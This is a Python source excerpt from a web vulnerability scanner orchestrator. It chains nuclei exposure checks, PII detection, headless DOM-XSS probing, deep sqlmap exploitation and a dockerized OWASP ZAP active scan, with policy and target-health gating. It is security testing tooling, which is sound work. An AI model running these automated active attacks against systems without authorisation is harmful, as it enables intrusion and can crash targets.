    # 2b) passive info-disclosure via CLI detectors (nuclei exposures/misconfig + PII/email
    # extractor) — the OSS analog to Burp's passive scanner (source/key/token/config
    # disclosure, emails/PII). Read-only GETs, so run regardless of active-scan policy.
    if tools:
        findings += run_nuclei_exposures(urls, cookie, politeness=pol)
        _prog.update("nuclei-exposures", findings, urls=len(urls), targets=len(targets))

    # 2c) PII / PHI disclosure (Presidio, Burp-style) — high-precision structured profile
    # (email, SSN, card w/ Luhn, IBAN, medical/passport/ITIN; NO NER-names, which false-
    # positive on markup). Two sources, merged: (a) the response-pipeline sink = PII seen in
    # AUDIT-time responses (how Burp caught the WAVSEP email), (b) a passive scan of the
    # crawled surface. Masked values only, never raw PHI. High value for FHC (healthcare).
    from .pii import scan_urls as _pii_scan
    set_pii_sink(None)   # stop capturing; drain what the probes fed
    _pii = list(_pii_collector.hits())
    _html = [u for u in urls if not u.split("?")[0].endswith(
        (".js", ".css", ".png", ".jpg", ".jpeg", ".gif", ".svg", ".ico", ".woff", ".woff2", ".map"))]
    _pii += _pii_scan(_html, cookie, cap=300, structured_only=True)
    _pii_seen: set = set()
    for hit in _pii:
        k = (hit.entity, hit.masked, hit.url.split("?")[0])
        if k in _pii_seen:
            continue
        _pii_seen.add(k)
        findings.append(Finding(
            tool="pii", category="pii-disclosure", url=hit.url, param=hit.entity,
            evidence=f"{hit.entity} disclosed: {hit.masked} (confidence {hit.score})",
            verified=True))

    _prog.update("pii", findings, urls=len(urls), targets=len(targets))

    # 3) vulnerable JS dependencies
    for vl in vuln_libs:
        findings.append(Finding(tool="jsanalysis", category="vulnerable-component", url=vl.url,
                                param=vl.library, evidence=f"{vl.library} {vl.version}: {vl.detail}",
                                verified=True))

    # 3b) Semgrep JS static analysis: source->sink flows in code the runtime DOM pass never
    # triggers (belt-and-suspenders for DOM data-manipulation / XSS). No-op if semgrep absent.
    from .jsanalysis import run_semgrep_js
    for sg in run_semgrep_js(js_urls, cookie):
        findings.append(Finding(tool="semgrep", category=sg["category"], url=sg.get("path", ""),
                                param=sg.get("check"), method="static",
                                evidence=(sg.get("message") or "")[:120]))

    # 4) DOM-based (headless): DOM-XSS + DOM open-redirect on HTML pages. This injects via a
    #    headless browser (client-side), so it is skipped under passive-only (no attack traffic).
    if dom and policy.active_scan and not health.halted:
        html_pages = sorted({u.split("#")[0] for u in urls
                             if not u.split("?")[0].endswith((".js", ".css", ".png", ".jpg",
                                                              ".svg", ".ico", ".woff", ".map"))})
        # map discovered params per page for DOM source testing
        page_params: dict = {}
        for t in targets:
            page_params.setdefault(t.url.split("?")[0], set()).update(t.params)
        for pg in html_pages[:25]:
            for d in dom_probe(pg, cookie, params=sorted(page_params.get(pg, []))):
                findings.append(Finding(tool="dom", category=d.category, url=d.url,
                                        param=d.source, evidence=d.evidence, verified=True))
    _prog.update("dom", findings, urls=len(urls), targets=len(targets))

    # 5) DEEP sqlmap exploitation LAST — the slowest + most target-hostile stage. By now the
    #    full detection matrix (nuclei/roster/probes/passive/PII/DOM) is already captured, so
    #    if sqlmap stresses or kills a fragile target the rest of the results still stand.
    #    Health-gated per target: reduced depth under stress, halt on target death.
    if tools and policy.active_scan:
        cookie = _session.ensure("sqlmap")   # the slowest stage; re-auth so it runs authenticated
        _refresh_jwt("sqlmap")
        _sql_targets = [t for t in active_targets if t.params]
        if _inject_cap:
            # stratified per-category spread (not the first N of a sorted, LFI-dominated list)
            _keep = set(_stratified_sample([t.url for t in _sql_targets], _inject_cap))
            _sql_targets = [t for t in _sql_targets if t.url in _keep]
        for _i, t in enumerate(_sql_targets):
            if health.check() >= 2:   # target unhealthy -> stop, keep everything already found
                break
            lvl = health.sqlmap_level(policy.sqlmap_level)
            findings += run_sqlmap(t, cookie, politeness=pol, policy=policy, level_override=lvl)
            if _i % 5 == 0:   # checkpoint periodically through the slow depth loop
                _prog.update(f"sqlmap[{_i + 1}/{len(_sql_targets)}]", findings,
                             urls=len(urls), targets=len(targets))
    _prog.update("sqlmap", findings, urls=len(urls), targets=len(targets))

    # 6) ZAP independent crawl + scan — a SECOND engine as a cross-check / accuracy insurance
    #    (its own spider + active rules corroborate the native stack; disagreements flag gaps on
    #    either side). Runs LAST because it re-crawls the target (heaviest, most target-hostile),
    #    and only while the target is healthy — a dockerized full-scan, skipped cleanly if docker
    #    or the image is absent. Findings are tagged tool="zap" so the cross-check is auditable.
    zap_ran = False
    zap_note = "disabled"
    if zap and tools and policy.active_scan:
        if health.check() >= 2:
            zap_note = "skipped: target unhealthy"
        elif not zap_available():
            zap_note = "skipped: docker/zap-stable image not available"
        else:
            import tempfile as _tf
            try:
                _zap_to = int(os.environ.get("DASTNG_ZAP_TIMEOUT", "2400") or "2400")
                # Feed ZAP the CONVERGED FRONTIER (default) so it active/passive-scans the exact
                # surface the native stack discovered — no reliance on ZAP's own spider/browser.
                # seed_url is only used by the legacy spider fallback (DASTNG_ZAP_MODE=spider).
                _zap_seed = (_seeds[0] if _seeds else "")
                findings += run_zap(target, cookie, _tf.mkdtemp(prefix="dastng-zap-"),
                                    timeout=_zap_to, seed_url=_zap_seed, frontier=urls)
                zap_ran = True
                zap_note = "ran"
            except Exception as exc:  # noqa: BLE001 - ZAP failure must not sink the scan
                zap_note = f"error: {exc}"
    _prog.update("zap", findings, urls=len(urls), targets=len(targets), note=zap_note)

    # dedup by (category, path, param) — but merge evidence so a richer duplicate wins its proof.
    seen: dict = {}; uniq: list[Finding] = []
    for f in findings:
        k = (f.category, urlsplit(f.url).path, f.param)
        if k in seen:
            kept = seen[k]
            if not kept.evidence_log and f.evidence_log:   # keep whichever carries real proof
                kept.evidence_log, kept.raw_output = f.evidence_log, (kept.raw_output or f.raw_output)
                kept.payload, kept.repro = (kept.payload or f.payload), (kept.repro or f.repro)
            continue
        seen[k] = f; uniq.append(f)
    # Uniform enrichment: every finding gets a detection method / confidence / payload / repro so
    # the report is deep even for tool findings that arrived thin. Derived from note + exchanges.
    for f in uniq:
        if not f.detection or not f.confidence or not f.repro:
            d, c, p, r = _derive_meta(f.evidence or f.verify_note, f.evidence_log)
            f.detection = f.detection or d
            f.confidence = f.confidence or c
            f.payload = f.payload or p
            f.repro = f.repro or r
    return {
        "urls": urls, "targets": len(targets),
        "findings": [f.__dict__ for f in uniq],
        # surface what the safety policy constrained, so coverage caps are never silent
        "policy": {
            "name": policy.name,
            "active_scan": policy.active_scan,
            "fuzz_forms": policy.fuzz_forms,
            "skip_state_changing": policy.skip_state_changing,
            "state_changing_endpoints_skipped": skipped_state_changing,
            "sqlmap": f"level {policy.sqlmap_level} risk {policy.sqlmap_risk} "
                      f"technique {policy.sqlmap_technique}",
            "inject_cap": _inject_cap or None,   # per-param heavy-tool cap (None = unbounded)
        },
        # adaptive health: what the target-stress monitor observed + did (never a silent cap)
        "health": {
            "stage": health.stage,          # 0 full depth, 1 reduced (L3), 2 halted
            "halted": health.halted,
            "sqlmap_level_used": health.sqlmap_level(policy.sqlmap_level),
            "events": health.events,
        },
        # ZAP cross-check: whether the second engine ran, so the corroboration is auditable
        "zap": {"ran": zap_ran, "note": zap_note,
                "findings": sum(1 for f in uniq if f.tool == "zap")},
        # session robustness: how many times the scan re-authenticated mid-run (0 = session held;
        # >0 = the keeper caught + recovered a session loss that would otherwise have silently
        # zeroed the scan). Surfaced so session health is auditable, never a silent degradation.
        "session": {"keeper": _session.enabled, "reauths": _session.reauths,
                    "authed_at_end": _session.alive() if _session.enabled else None},
    }


# ----- ZAP (passive categories + generative active scan, dockerized) ----------

def zap_available() -> bool:
    """True if the dockerized ZAP can run (docker daemon up + zap-stable image pulled).
    Lets the mega scan include ZAP when present and cleanly skip it when not."""
    try:
        if subprocess.run(["docker", "info"], capture_output=True, timeout=15,
                          check=False).returncode != 0:
            return False
        img = subprocess.run(["docker", "images", "-q", "zaproxy/zap-stable"],
                             capture_output=True, text=True, timeout=15, check=False)
        return bool((img.stdout or "").strip())
    except Exception:  # noqa: BLE001 - any failure = not available
        return False


def _zap_host_rewrite(u: str) -> str:
    """localhost/127.0.0.1 inside the container is the CONTAINER, not the host. Rewrite to
    host.docker.internal so ZAP reaches the app on the Mac. (LAN IPs pass through unchanged.)"""
    for lh in ("localhost", "127.0.0.1"):
        if f"//{lh}" in u:
            return u.replace(f"//{lh}", "//host.docker.internal")
    return u


def run_zap(target: str, cookie: str, out_dir: str, timeout: int = 2400,
            seed_url: str = "", frontier: list[str] | None = None) -> list[Finding]:
    """OWASP ZAP as a SECOND ENGINE over the converged frontier. Requires docker + the
    zaproxy image.

    Default mode ('frontier'): feed ZAP the exact URL set dast-ng already discovered (katana +
    link-harvester + feroxbuster + JS-extracted routes) via a ZAP Automation Framework plan
    (import -> passive scan -> active scan -> JSON report). ZAP then attacks the same surface the
    native stack does, WITHOUT depending on ZAP's own spider or the container's broken headless
    browser (the AJAX spider fails as 'Failed to configure ZAP extension on browser launch').
    This is the reliable way to make ZAP process everything the tool found, every scan.

    Set DASTNG_ZAP_MODE=spider to fall back to the legacy zap-full-scan self-crawl (seed_url
    then points ZAP at a link-rich entry). frontier is the URL list; seed_url is the spider seed.
    """
    import os
    import re

    from .scoring.normalize import normalize_zap
    # CRITICAL: docker (colima) bind-mounts only shared host paths. On this host that is /Users
    # ONLY — not /tmp, /private/tmp, or macOS $TMPDIR (/var/folders). A working dir outside the
    # shared root mounts EMPTY inside the container ("Cannot access /zap/wrk/plan.yaml") and the
    # report is written container-side to a path that never appears on the host => run_zap saw no
    # zap.json and returned 0. THIS was the real ZAP 0-findings cause. Force the working dir under
    # a shared base (default ~/.dastng/zap, overridable) regardless of the out_dir we were given.
    _base = os.environ.get("DASTNG_ZAP_WORKDIR", os.path.expanduser("~/.dastng/zap"))
    os.makedirs(_base, exist_ok=True)
    out_dir = tempfile.mkdtemp(prefix="zap-", dir=_base)
    report_path = os.path.join(out_dir, "zap.json")
    ck = cookie.replace("; ", ";")
    # Auth cookie replacer + logout exclusion — shared by both modes, passed as ZAP -config.
    auth_cfg = [
        "-config", "replacer.full_list(0).description=auth",
        "-config", "replacer.full_list(0).enabled=true",
        "-config", "replacer.full_list(0).matchtype=REQ_HEADER",
        "-config", "replacer.full_list(0).matchstr=Cookie",
        "-config", "replacer.full_list(0).regex=false",
        "-config", f"replacer.full_list(0).replacement={ck}",
        "-config", "anticsrf.tokens.token(0).name=user_token",
        "-config", "anticsrf.tokens.token(0).enabled=true",
        "-config", "scanner.threadPerHost=2",       # fragile single-process targets
        "-config", "connection.timeoutInSecs=30",
    ]
    mode = os.environ.get("DASTNG_ZAP_MODE", "frontier")

    def _parse() -> list[Finding]:
        if not os.path.exists(report_path):
            _tail = "\n".join((_zap_out or "").splitlines()[-20:])
            print(f"[zap] NO report written — did not complete cleanly. Tail:\n{_tail}", flush=True)
            return []
        with open(report_path, encoding="utf-8") as fh:
            report = json.load(fh)
        out: list[Finding] = []
        for n in normalize_zap(report):
            out.append(Finding(tool="zap", category=n.category, url=n.url, param=n.param,
                               evidence=n.raw.get("name", "")))
        # Soft-404 guard: on catch-all/SPA-routing apps, ZAP's file-existence checks
        # (.env/.htaccess/Trace.axd/backup-file leaks) false-positive on the index page. Re-verify
        # each existence finding against the app's not-found fingerprint and drop the FPs. Findings
        # carry the container's host.docker.internal host, so map it back to the reachable target.
        def _hr(u: str) -> str:
            return u.replace("host.docker.internal", urlsplit(target).hostname or "localhost")
        out, _dropped = _soft404_filter(out, target, cookie, host_rewrite=_hr)
        if _dropped:
            print(f"[zap] soft-404 guard dropped {_dropped} file-existence false positive(s)",
                  flush=True)
        return out

    if mode == "frontier" and frontier:
        # Build the URL feed: in-scope, host-rewritten, deduped, capped (stratified so the cap
        # spreads across the path tree, not the first N of one directory).
        zt = _zap_host_rewrite(target)
        _p = urlsplit(zt)
        want = (_p.hostname or "").lower()
        feed = []
        for u in frontier:
            ru = _zap_host_rewrite(u)
            if (urlsplit(ru).hostname or "").lower() in (want, "host.docker.internal"):
                feed.append(ru)
        # Drop static assets: active-scanning .js/.css/images/fonts has no injectable surface,
        # just bloats the scan tree and the JVM footprint (contributes to OOM). Passive rules
        # (CORS/CSP/headers) still fire from the dynamic responses we keep.
        _STATIC = re.compile(r'\.(?:js|css|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|map|webp|mp4|pdf)'
                             r'(?:\?|$)', re.I)
        feed = [u for u in feed if not _STATIC.search(u)]
        # Dedup to distinct ENDPOINTS (path + query-param NAMES). The crawl yields hundreds of
        # query-VALUE variations of the same few endpoints; feeding all of them bloats — and can
        # OOM-crash — ZAP's active scan for zero extra coverage, because ZAP fuzzes the param
        # values itself. Keep one representative URL per (path, sorted param names).
        _byep = {}
        for u in sorted(set(feed)):
            _pp = urlsplit(u)
            _names = tuple(sorted(kv.split('=')[0] for kv in _pp.query.split('&') if kv))
            _byep.setdefault((_pp.path, _names), u)
        feed = list(_byep.values()) or [zt]
        cap = int(os.environ.get("DASTNG_ZAP_URL_CAP", "150") or "150")
        if len(feed) > cap:
            feed = _stratified_sample(feed, cap)
        with open(os.path.join(out_dir, "frontier.txt"), "w", encoding="utf-8") as fh:
            fh.write("\n".join(feed))
        # Active-scan budget must fit INSIDE the outer subprocess timeout alongside ZAP startup,
        # the URL import (one GET per fed URL), the passive-wait, and the report job — otherwise
        # ZAP is killed mid-active-scan and never writes the report (the Juice 198-URL/high-strength
        # timeout). Reserve ~20 min of headroom (passive 8 + import/startup/report ~12).
        _passive_min = 8
        budget = max(10, timeout // 60 - 20)
        # Attack strength: 'medium' is right for a huge frontier (WAVSEP); a small target can
        # afford 'high' for maximum thoroughness. DASTNG_ZAP_STRENGTH overrides.
        strength = os.environ.get("DASTNG_ZAP_STRENGTH", "medium").lower()
        if strength not in ("low", "medium", "high", "insane"):
            strength = "medium"
        scope_re = f"{_p.scheme}://{re.escape(_p.netloc)}.*"
        plan = f"""env:
  contexts:
    - name: dastng
      urls: ['{zt}']
      includePaths: ['{scope_re}']
      excludePaths: ['.*logout.*', '.*signout.*', '.*/reset.*']
  parameters:
    failOnError: false
    failOnWarning: false
    progressToStdout: true
jobs:
  - type: import
    parameters: {{type: url, fileName: /zap/wrk/frontier.txt}}
  - type: passiveScan-wait
    parameters: {{maxDuration: {_passive_min}}}
  - type: activeScan
    parameters:
      context: dastng
      maxScanDurationInMins: {budget}
    policyDefinition:
      defaultStrength: {strength}
      defaultThreshold: low
  - type: report
    parameters:
      template: traditional-json
      reportDir: /zap/wrk/
      reportFile: zap.json
"""
        with open(os.path.join(out_dir, "plan.yaml"), "w", encoding="utf-8") as fh:
            fh.write(plan)
        print(f"[zap] frontier mode: feeding {len(feed)} URL(s) to ZAP "
              f"(active-scan budget {budget} min)", flush=True)
        # ZAP's ergonomic default heap is ~25% of visible RAM (~1.5G on a 6G VM) — too small to
        # active-scan 100+ URLs, which OOM-crashes the JVM mid-scan (no report). Bump the heap
        # (DASTNG_ZAP_XMX, default 3g). zap.sh forwards -Xmx to the JVM.
        _xmx = os.environ.get("DASTNG_ZAP_XMX", "3g")
        args = ["docker", "run", "--rm", "--add-host=host.docker.internal:host-gateway",
                "-v", f"{os.path.abspath(out_dir)}:/zap/wrk/:rw",
                "zaproxy/zap-stable", "zap.sh", f"-Xmx{_xmx}", "-cmd",
                "-autorun", "/zap/wrk/plan.yaml", *auth_cfg]
        _zap_out = _run(args, timeout=timeout)
        return _parse()

    # ---- legacy fallback: ZAP self-crawls (DASTNG_ZAP_MODE=spider, or no frontier) ----------
    zt = _zap_host_rewrite(seed_url or target)
    _spider_min = int(os.environ.get("DASTNG_ZAP_SPIDER_MIN", "10") or "10")
    zopts = " ".join(auth_cfg) + (
        " -config globalexcludeurl.url_list.url(0).regex=.*logout.*"
        " -config globalexcludeurl.url_list.url(0).enabled=true"
        f" -config spider.maxDuration={_spider_min}"
        " -config spider.maxDepth=10 -config spider.maxChildren=0"
    )
    args = ["docker", "run", "--rm", "--add-host=host.docker.internal:host-gateway",
            "-v", f"{os.path.abspath(out_dir)}:/zap/wrk/:rw",
            "zaproxy/zap-stable", "zap-full-scan.py", "-t", zt,
            "-J", "zap.json", "-a", "-m", str(_spider_min), "-T", "90", "-I", "-z", zopts]
    if os.environ.get("DASTNG_ZAP_AJAX", "0") == "1":
        args.insert(-3, "-j")
    _zap_out = _run(args, timeout=timeout)
    return _parse()
